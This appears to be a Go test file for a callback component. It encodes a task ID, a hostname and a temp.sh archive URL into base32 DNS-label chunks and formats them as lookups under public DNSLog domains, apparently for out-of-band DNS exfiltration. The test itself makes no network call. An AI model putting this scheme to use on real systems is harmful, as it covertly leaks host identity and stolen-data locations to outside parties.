package callback

import (
	"encoding/base32"
	"fmt"
	"strings"
	"testing"
)

func TestDNSRoundTripDecode(t *testing.T) {
	taskID := "op42"
	host := "SimondeMacBook-Pro.local"
	url := "https://temp.sh/etqoV/output_20260720_100831.tar.gz"
	want := taskID + "|" + host + "|" + url

	label, chunks := EncodeDNSChunks(taskID, host, url)
	if label != "op42" {
		t.Fatalf("label=%q", label)
	}
	if len(chunks) != 4 {
		t.Fatalf("expected 4 chunks for this payload, got %d: %v", len(chunks), chunks)
	}
	for i, c := range chunks {
		if len(c) > 63 {
			t.Fatalf("chunk %d too long: %d", i, len(c))
		}
		// Simulate DNSLog lines in both dnslog.cn and nested base styles.
		_ = fmt.Sprintf("%d-%d-%s.%s.ie0gyx.dnslog.cn", i, len(chunks), c, label)
		_ = fmt.Sprintf("%d-%d-%s.%s.8c2f0fe1.log.dnslog.pp.ua", i, len(chunks), c, label)
	}

	enc := strings.ToUpper(strings.Join(chunks, ""))
	enc += strings.Repeat("=", (8-len(enc)%8)%8)
	got, err := base32.StdEncoding.DecodeString(enc)
	if err != nil {
		t.Fatal(err)
	}
	if string(got) != want {
		t.Fatalf("got %q want %q", got, want)
	}
}

func TestDNSRoundTripMatchesUserSample(t *testing.T) {
	// Captured from a successful local run (dnslog.pp.ua).
	chunks := []string{
		"n5ydimt4knuw233omrsu2yldijxw62znkbzg6ltm",
		"n5rwc3d4nb2hi4dthixs65dfnvyc443if5sxi4lp",
		"kyxw65luob2xixzsgazdmmbxgiyf6mjqga4dgmjo",
		"orqxelthpi",
	}
	enc := strings.ToUpper(strings.Join(chunks, ""))
	enc += strings.Repeat("=", (8-len(enc)%8)%8)
	got, err := base32.StdEncoding.DecodeString(enc)
	if err != nil {
		t.Fatal(err)
	}
	want := "op42|SimondeMacBook-Pro.local|https://temp.sh/etqoV/output_20260720_100831.tar.gz"
	if string(got) != want {
		t.Fatalf("got %q want %q", got, want)
	}
}
